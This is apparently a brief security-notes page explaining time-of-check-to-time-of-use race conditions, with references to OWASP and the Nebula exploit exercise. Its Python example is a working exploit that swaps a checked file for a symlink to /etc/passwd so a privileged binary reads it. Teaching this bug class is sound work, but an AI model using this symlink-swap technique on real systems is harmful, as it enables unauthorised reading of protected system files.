---
description: Gotta go fast!
---

# Race Conditions

## Time of check to time of use

Time of check to time of use \(TOCTOU\) bugs are classes of bugs in which access or permissions to a resource are verified independently of their actual use.  In cases like this it requires something that the user can modify independently of the process.  

A classic example is that of the access to fopen call in C.  Take the following example of a binary which checks we can access a file, say `/home/ubuntu/testfile` and then after a certain amount of time opens it and displays the results:

```python
import os
import subprocess
import time
import sys

os.system('touch /home/ubuntu/testfile')
proc = subprocess.Popen(['/usr/bin/opentestfile', '/home/ubuntu/testfile'], stdout=subprocess.PIPE)
time.sleep(.5) #Do this to ensure the access check runs
os.system('rm /home/ubuntu/testfile')
os.system('ln -s /etc/passwd /home/ubuntu/testfile')
proc.wait()
print proc.communicate()
os.system('rm /home/ubuntu/testfile')
```

This form of race-condition can take many forms from socket communications to file access.

#### References

[Nebula 10 - Exploit Exercises](http://blog.kernelsecurity.es/2013/06/06/nebula-level10-exploiting-access-syscall-toctou-race-condition/)  
[Wikipedia](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use)  
[OWASP - Time of check to time of use](https://www.owasp.org/index.php/Time_of_check,_time_of_use_race_condition)

